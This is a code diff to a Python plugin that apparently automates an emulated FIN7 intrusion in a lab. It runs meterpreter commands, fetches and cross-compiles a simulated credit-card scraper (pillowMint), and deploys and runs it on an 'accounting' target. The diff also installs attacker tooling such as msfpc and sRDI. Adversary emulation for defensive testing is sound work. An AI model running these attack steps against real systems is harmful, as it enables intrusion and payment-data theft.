@@ -6,6 +6,7 @@ from plugins.base.attack import AttackPlugin
 from app.interface_sfx import CommandlineColors
 from app.metasploit import MSFVenom, Metasploit
 import os
+import time
 
 
 class FIN7Plugin(AttackPlugin):
@@ -182,9 +183,10 @@ class FIN7Plugin(AttackPlugin):
         print(metasploit.meterpreter_execute_on(["arp"], hotelmanager))
         # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
         # TODO: Add a new machine in config as <itadmin> ip. Re-activate. This command caused trouble afterwards (uploading mimikatz). Maybe it is because of an error
-        itadmin = self.get_target_by_name("itadmin")
+        itadmin = self.get_target_by_name("itadmin").get_ip()
         self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
-        print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], hotelmanager))
+        cmd = f"execute -f nslookup.exe -H -i -a '{itadmin}'"
+        print(metasploit.meterpreter_execute_on([cmd], hotelmanager))
 
         # Copy step 5 attack tools to attacker
 
@@ -243,7 +245,12 @@ class FIN7Plugin(AttackPlugin):
 
     def step7(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 7 on itadmin: Setup User Monitoring{CommandlineColors.ENDC}", 1)
+
+        # Start situation: Step 6 executed a meterpreter in hollow.exe We can fake that to be able to start with step 7 directly
+
+
+
 
         # This is meterpreter !
         # Emulating DLL hijacking functionality of BOOSTWRITE
@@ -295,11 +302,39 @@ class FIN7Plugin(AttackPlugin):
 
         # Scenario target is the fake payment application AccountingIQ.exe
 
-        # Machine is rebooted
-        # shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
-        # AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
-        # debug.exe is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
-        # send 7za.exe to target. Zip stolen data, exfiltrate
+        # TODO: Machine is rebooted
+        # TODO: shim dll329.dll is activated https://attack.mitre.org/techniques/T1546/011/
+        # TODO: AccountingIQ injects into SyncHost.exe, rundll32.exe communicates to C2
+        # TODO: debug.exe(pillowMint.exe) is downloaded from C2, does process discovery https://attack.mitre.org/techniques/T1105/
+        # TODO: send 7za.exe to target. Zip stolen data, exfiltrate
+
+        # Compiling
+
+        # i686-w64-mingw32-gcc is for 32 bit
+        # x86_64-w64-mingw32-gcc is for 64 bit
+
+        # Important: pillowMint is not very complex and looks for the data at a fixed address. As we a re-compiling AccountIQ.exe and the data address does not match the expected one we will just get garbage.
+
+        # simulated credit card tool as target
+        self.attacker_machine_plugin.remote_run("cd tool_factory; rm AccountingIQ.exe")
+        self.attacker_machine_plugin.remote_run("cd tool_factory; rm AccountingIQ.c; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/AccountingIQ.c")
+        self.attacker_machine_plugin.remote_run("cd tool_factory; i686-w64-mingw32-gcc -m32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include AccountingIQ.c -o AccountingIQ.exe")
+
+        self.attacker_machine_plugin.get("tool_factory/AccountingIQ.exe", os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"))
+
+        # Simulated credit card scraper
+        self.attacker_machine_plugin.remote_run("cd tool_factory; rm pillowMint.exe")
+        self.attacker_machine_plugin.remote_run("cd tool_factory; rm pillowMint.cpp; wget https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step10/pillowMint.cpp")
+        self.attacker_machine_plugin.remote_run("cd tool_factory; x86_64-w64-mingw32-g++ -static pillowMint.cpp -o pillowMint.exe")
+        self.attacker_machine_plugin.get("tool_factory/pillowMint.exe", os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"))
+
+        accounting = self.get_target_by_name("accounting")
+        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "pillowMint.exe"), "pillowMint.exe")
+        accounting.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step10", "AccountingIQ.exe"), "AccountingIQ.exe")
+
+        accounting.remote_run("AccountingIQ.exe", disown=True)
+        time.sleep(1)
+        accounting.remote_run("pillowMint.exe", disown=False)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)
@@ -307,8 +342,13 @@ class FIN7Plugin(AttackPlugin):
     def install(self):
         """ Install tools for the attack """
 
-        # MSFVenom
+        self.attacker_machine_plugin.remote_run("mkdir tool_factory")  # MSFVenom needs to be installed
         self.attacker_machine_plugin.remote_run("sudo apt -y install msfpc")  # MSFVenom needs to be installed
+        self.attacker_machine_plugin.remote_run("sudo apt -y install g++-mingw-w64")  # Cross compiler
+        self.attacker_machine_plugin.remote_run("sudo apt -y install mingw-w64")  # Cross compiler
+        self.attacker_machine_plugin.remote_run("sudo apt -y install powershell")  # Microsoft powershell
+        self.attacker_machine_plugin.remote_run("sudo apt -y install g++-multilib libc6-dev-i386")  # 32 bit support
+        self.attacker_machine_plugin.remote_run("cd tool_factory; git clone https://github.com/monoxgas/sRDI")  # To generate PIC
 
     def run(self, targets):
         """ Run the command
@@ -316,15 +356,15 @@ class FIN7Plugin(AttackPlugin):
         @param targets: A list of targets
         """
 
-        self.step1()
-        self.step2()
-        self.step3()  # Done and works
-        self.step4()  # Partial - with a hack
-        self.step5()  # Done and quite ok
-        self.step6()
-        self.step7()
-        self.step8()
-        self.step9()
-        self.step10()
+        # self.step1()
+        # self.step2()
+        # self.step3()  # DONE and works
+        # self.step4()  # PARTIAL - with a hack. Needs compilation of babymetal: Needs a powershell to execute on the build system. And this one needs system access
+        # self.step5()  # DONE and quite ok
+        # self.step6()  # Hollow.exe has to be generated
+        # self.step7()  # Will need compilation of an attack tool Boostwrite
+        # self.step8()  # Migration and credential collection, on itadmin
+        # self.step9()  # on accounting, shim persistence bin329.tmp needs to be generated
+        self.step10()  # on accounting, AccountingIQ.c needs compilation. But just once.
 
         return ""
